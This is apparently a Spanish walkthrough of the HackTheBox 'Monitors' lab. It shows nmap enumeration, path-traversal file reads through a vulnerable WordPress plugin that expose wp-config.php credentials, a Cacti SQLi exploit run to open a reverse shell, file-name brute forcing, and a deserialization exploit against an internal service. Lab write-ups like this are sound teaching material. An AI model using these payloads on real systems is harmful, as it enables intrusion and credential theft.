# MONITORS

<img width="593" alt="monitors" src="https://user-images.githubusercontent.com/87484792/185144891-1929fa9f-e63a-42cc-97f4-c0f7f429c681.png">

## Datos de Interés

Esta máquina la catalogaría de excelente. Son conceptos básicos lo que explotaremos, pero requieres tener buen ojo donde buscar. Empezaremos con una enumeración basica que tras investigar su puerto 80, nos dará como resultado un dominio existente. En este dominio encontraremos alojado un WordPress con un plugin vulnerable a RFI. Pasaremos a obtener unas credenciales validas de un subdominio nuevo. De donde sacaremos una shell como el usuario www-data debido a un SQLi y una ejecución de comandos de la misma.


## Enumeración

Empezamos con una enumeración basica de puertos:

`sudo nmap --min-rate 5000 -vvv -p- -sSCV --open -Pn -n -oN servicesPorts.txt 10.10.10.238`

**NMAP** nos reporta dos puertos conocidos: "22 (SSH) & 80 (HTTP)"

![image](https://user-images.githubusercontent.com/87484792/185152874-93dc1d57-3473-4bf3-91c1-706727d65b5c.png)

Como hay tan pocos puertos para atacar, el autor nos deja claro que el camino será via HTTP. Así que investigemos un poco.

## PUERTO 80

Lo primero que nos encontramos al poner la dirección IP será este "mensaje de error" denegandonos el acceso.

![image](https://user-images.githubusercontent.com/87484792/185160859-3b0af02f-f00d-4cc8-9219-07f462d44d83.png)

Realmente nada nos deniega el acceso, pero no hay mucho que ver aqui. Lo interesante es que tenemos un nombre de dominio que podemos incluir en nuestro */etc/hosts*

En el */etc/hosts*:

`10.10.10.238   monitors.htb`

Con esto, podemos observar que se aplica un virtual hosting, y que la página nos muestra algo completamente distinto.

![image](https://user-images.githubusercontent.com/87484792/185161957-5e77ab62-642c-43a7-95f3-a9a8a3c4418e.png)

Ahora que tenemos un dominio donde empezar a trabajar, investigaré un poco. La página parece algo simple, y puedo sacar en claro que hay un usuario "admin" pues es el autor de los post escritos en la web. Antes de hacer un fuzzeo de la web. Me fijo en el código fuente y observo que hay un CMS de wordpress alojado. Incluso hay un pluggin mostrado claramente. 

![image](https://user-images.githubusercontent.com/87484792/185164703-64150116-6fdc-4795-a13e-6400f974c902.png)

Da que pensar que esto pueda ser una pista intencionada para resolver la máquina. Investigaré un poco sobre este plugins a ver si resulta vulnerble.

![image](https://user-images.githubusercontent.com/87484792/185169741-d7afe6c1-f6fc-41c4-b76b-eee1a9008c4f.png)

Efectivamente, este plugin es vulnerable. Nos otorga la capacidad de leer archivos tanto locales como remotos, puesto que se trata de un **RFI**.
Puesto que tenemos un WordPress, y que podemos leer archivos, pienso rapidamente en buscar el archivo **wp-config.php**. En este archivo se encuentran credenciales en texto claro, entre otras cosas.

La ejecución de esta vulnerabilidad es simple. 

Código vulnerable:
```
if(isset($_GET['url'])){
$content=file_get_contents($_GET['url']);
```
El archivo de configuración espera un parametro *URL*, si se le otorga, nos dará pie a obtener el contenido del fichero que le pasemos. 

Pongamoslo en practica buscando el archivo anteriormente nombrado.

`view-source:http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php`

![image](https://user-images.githubusercontent.com/87484792/185168892-f4b89563-e133-4f70-9091-ed4a1c34e538.png)

Tenemos un usuario y contraseña. `wpadmin:BestAdministrator@2020!`

Tambien miré el */etc/passwd*, tenemos un usuario llamado **Marcus**.

Por desgracia en el panel de sesión de Wordpress no resultó ser válidos. El usuario no se encontraba como válido, **admin** si era válido, pero esa contraseña no.
Probé inicio de sesión en SSH como marcus, pero tampoco resulto ser válido. En este punto tuve que investigar un poco más archivos que pudieran interesarme. Claves privadas, archivos de logs... nada parece funcionar.

## Shell como www-data

En este punto tenemos un dominio, y una forma de leer archivos arbitrarios de la maquina victima. Se me ocurrió que podria leer:

`/etc/apache2/sites-available/000-default.conf`

En este archivo se encuentran dominios junto al puerto que lo hostea. Echaré un ojo para ver si hay algo interesante que pueda ayudarme.

`view-source:http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/sites-available/000-default.conf`

De primeras me costó verlo, pero arriba del todo hay una parte comentada donde tenemos dos dominios. Aunque terminan en *.conf*, realmente parecen ser conocidos.
El primero es el dominio que ya conocemos, el segundo tiene un subdominio extra.

![image](https://user-images.githubusercontent.com/87484792/185172390-e2464e12-66f7-4e44-a88c-b037983fa943.png)

Agregamos este subdominio a nuestro */etc/hosts*:

`cacti-admin.monitors.htb`

Veamos que nos encontramos en este subdominio.

![image](https://user-images.githubusercontent.com/87484792/185172739-3c2da776-91b9-4899-95e2-e8b4ae1a40ab.png)

Un panel de inicio de sesión, probaremos con las credenciales que habiamos obtenido previamente.

Era la primera vez que conocia de la existencia de *Cacti*, decidí buscar en Google de que se trataba, tambien apunte la versión porque podria ser interesante.
Esto es lo que dice Wikipedia:

`Cacti es una completa solución para la generación de gráficos en red, diseñada para aprovechar el poder de almacenamiento y la funcionalidad para gráficas que poseen las aplicaciones RRDtool`

Trataré de loguearme y luego buscaré alguna forma de obtener una shell.

![image](https://user-images.githubusercontent.com/87484792/185173520-899031a1-60a3-411a-9bfd-9b2e7ce9b10d.png)

Perfecto, las credenciales son válidas. Hora de ver como podemos vulnerarlo.

![image](https://user-images.githubusercontent.com/87484792/185173922-394362ab-b638-4725-98ae-ca01cfe0f42a.png)

Siquiera pongo el nombre, y las primeras recomendaciones son exploits, esto pinta bien (*aunque no para el admin de Cacti*).
La vulnerabilidad consiste en un SQLi, aprovecharé que ya tengo un exploit listo para usar, e intentaré sacar lo que pueda de aqui.
Revisando el exploit, podemos inyectar comandos en la petición y como resultado obtener una shell. El exploit es bastante sencillo de usar:

`python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p 'BestAdministrator@2020!' --lhost 10.10.16.7 --lport 8888`

![image](https://user-images.githubusercontent.com/87484792/185175433-6536ee04-d7c3-462a-9342-0f6950424304.png)

## www-data -> Marcus

Una vez tenemos una shell como el usuario www-data, y haciendo un tratamiento de la TTY. Toca investigar como avanzar.

![image](https://user-images.githubusercontent.com/87484792/185176203-55c64125-bb0d-47f0-a74d-ee5fe1d13f37.png)

El usuario marcus tiene la flag de user, sin embargo no tenemos privilegios para leerla. Una cosa interesante es que tenemos un directorio **.backup**. Sin embargo los privilegios son algo extraños. Podemos atravesar el directorio, pero no podemos visualizar su contenido. Aqui se me ocurren dos caminos que podemos tomar. 
Podemos buscar archivos con la ruta, para ver si alguno nos muestra el contenido, o podemos scriptear un ataque de fuerza bruta para intentar ejecutar a ciegas algún archivo, este camino tomará mucho tiempo y no es del todo seguro que podamos encontrarlo. Sin embargo explicaré el mecanismo.

Antes de probar nada, intenté ejecutar algún *id_rsa* o archivos similares. No tuve suerte.

### Step 1:

Buscaré de forma recursiva desde la raiz en algunos directorios donde se alojen ficheros de configuración. Este directorio es */etc*. Probaré a ver si encuentro algo.

`grep -R "/home/marcus/.backup" /etc 2>/dev/null`

![image](https://user-images.githubusercontent.com/87484792/185179355-5d37c980-9783-42cb-96f7-b0d3d9917d01.png)

### Step 2 [No aconsejable]:

Crearé un oneliner simple que automatice un *cat* con la ruta absoluta, buscando si algún archivo existe. Como desconozco cualquier tipo de dato relacionado con el archivo que estoy buscando, será un proceso lento. Probaré sin extensión y con extensiones comunes *.bak,.sh,.py,.txt,.conf*

El oneliner quedaria así:

`while read line; do cat /home/marcus/.backup/$line.sh 2>/dev/null; done < filesBruteForce`

El archivo `filesBruteForce` es un `head -n 50000 rockyou.txt`. 50000 es un número random, puedes jugar con él, pero cuanto menos valor ponga, menos posibilidades de dar con el nombre correcto. 

Despues de probar, finalmente se encontró. 

![image](https://user-images.githubusercontent.com/87484792/185182064-51387100-8088-4254-aa45-632ab6df3847.png)

Tenemos una contraseña, así que `su marcus` y ponemos la contraseña `VerticalEdge2020`

### Marcus -> Root [Container]

Ya como Marcus podemos visualizar la flag `user.txt`. La maquina tiene contenedores desplegados, y en los puertos podemos observar que hay puertos que solo tenemos acceso internamente.

![image](https://user-images.githubusercontent.com/87484792/185183000-8da1ea49-75e4-44a1-b209-2154a075255b.png)

El puerto **8443** solamente esta disponible de forma interna, tengo curiosidad por ver que se está cociendo allí. 
Traeré este puerto a mi maquina con un Local Port Forwarding desde SSH con el usuario marcus.

`ssh marcus@monitors.htb -L 8443:localhost:8443`

![image](https://user-images.githubusercontent.com/87484792/185183602-852a40d5-67e3-45aa-b99c-6b61193e5311.png)

No parece que haya nada, fuzzearé de forma local para ver si encuentro algo de utilidad.

`dirsearch --url https://localhost:8443`

![image](https://user-images.githubusercontent.com/87484792/185184411-0885a41f-d92f-407c-bdca-befad472f00f.png)

Encontramos algo de utilidad, ambas rutas nos redirigen al mismo sitio.

![image](https://user-images.githubusercontent.com/87484792/185184724-a483b5b3-370c-4c17-aebf-29ef509c7431.png)

Otro login, probé con la reutilización de credenciales, pero no parece gustarle.
Abajo en la esquina se encuentra la versión de este panel de inicio.

![image](https://user-images.githubusercontent.com/87484792/185184878-1646256a-d7b8-464f-953f-028c3a287333.png)

Tras una busqueda en Google, descubro que es vulnerable a un ataque de deserialización.

![image](https://user-images.githubusercontent.com/87484792/185185385-2ff39c9d-ad55-416d-b904-9b47350dca65.png)

Existen muy pocos xploits disponibles, y tras revisar el POC, decido armar este exploit programado en Python3.
Podeis revisar y descargar el xploit desde mi propio Github:

`https://github.com/Ly0nt4r/CVE-2020-9496`  :)

![image](https://user-images.githubusercontent.com/87484792/185186052-d405d051-2e49-484d-8183-230e01bf2934.png)




